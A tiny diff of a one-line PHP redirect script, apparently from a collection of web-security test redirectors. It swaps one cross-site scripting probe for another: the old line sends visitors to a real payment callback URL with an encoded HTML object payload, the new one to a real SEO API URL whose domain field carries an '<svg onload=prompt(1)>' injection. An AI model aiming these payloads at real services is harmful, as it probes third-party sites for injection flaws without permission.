@@ -1,4 +1,4 @@
-<?php header('location: https://simplify.com/commerce/masterPass/callbackHandler?key=%3C?PXML%3E%3Chtml:object%20data=https://html5sec.org/test.svg%3E
+<?php header('location: https://us.api.semrush.com/?action=report&type=domain_rank&domain=i<svg%20onload=prompt(1);%2f%2f.wordpress.com
 ')?>
 
 
